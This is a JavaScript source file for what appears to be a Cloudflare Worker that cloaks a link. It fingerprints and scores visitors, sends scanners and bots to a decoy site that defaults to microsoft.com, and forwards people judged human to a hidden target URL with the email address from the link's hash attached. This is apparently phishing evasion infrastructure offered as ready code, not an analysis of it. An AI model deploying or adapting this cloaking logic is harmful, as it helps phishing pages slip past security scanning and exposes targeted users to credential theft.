import { scoreRequest, scoreClientTelemetry } from './detection.js';
import { generateCookie, verifyCookie } from './crypto.js';
import { getInterstitialHTML } from './interstitial.js';

function parseCookie(header, name) {
  const match = header.match(new RegExp(`(?:^|;\\s*)${name}=([^;]*)`));
  return match ? match[1] : null;
}

export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const targetUrl = env.TARGET_URL || 'https://example.com';
    const decoyUrl = env.DECOY_URL || 'https://microsoft.com';
    const cookieSecret = env.COOKIE_SECRET || 'change-this-secret';
    const cookieTTL = parseInt(env.COOKIE_TTL || '14400');
    const scoreThreshold = parseInt(env.SCORE_THRESHOLD || '50');
    const pageTitle = env.PAGE_TITLE || 'Secure Access';

    // Layer 1: Server-side scoring (ASN + headers)
    const serverScore = scoreRequest(request);

    // Instant kill for known scanner ASNs
    if (serverScore >= 100) {
      return Response.redirect(decoyUrl, 302);
    }

    // Layer 2: Valid session cookie = skip everything, but use JS redirect to format the hash
    const cookieHeader = request.headers.get('Cookie') || '';
    const sessionCookie = parseCookie(cookieHeader, '__sess');
    if (sessionCookie) {
      const valid = await verifyCookie(sessionCookie, cookieSecret, cookieTTL);
      if (valid) {
        const jsRedirect = `<!DOCTYPE html><html><head><script>
          var hash = window.location.hash;
          var email = hash.includes('=') ? hash.split('=')[1] : hash.replace('#', '');
          window.location.replace('${targetUrl}' + (email ? '#' + email : ''));
        </script></head><body></body></html>`;
        
        return new Response(jsRedirect, {
          headers: {
            'Content-Type': 'text/html; charset=utf-8',
            'Cache-Control': 'no-store, no-cache, must-revalidate',
          },
        });
      }
    }

    // Layer 3: Verification POST from client-side JS
    if (request.method === 'POST' && url.pathname === '/verify') {
      try {
        const body = await request.json();
        const clientScore = scoreClientTelemetry(body);
        const totalScore = serverScore + clientScore;

        if (totalScore >= scoreThreshold) {
          return Response.json({ redirect: decoyUrl });
        }

        // Human confirmed
        const cookie = await generateCookie(
          cookieSecret,
          request,
          body.fingerprint || ''
        );

        return new Response(JSON.stringify({ redirect: targetUrl }), {
          headers: {
            'Content-Type': 'application/json',
            'Set-Cookie': `__sess=${cookie}; Path=/; HttpOnly; Secure; SameSite=Lax; Max-Age=${cookieTTL}`,
          },
        });
      } catch {
        return Response.json({ redirect: decoyUrl });
      }
    }

    // Layer 4: Serve interstitial page
    return new Response(getInterstitialHTML(pageTitle), {
      headers: {
        'Content-Type': 'text/html; charset=utf-8',
        'Cache-Control': 'no-store, no-cache, must-revalidate',
      },
    });
  },
};
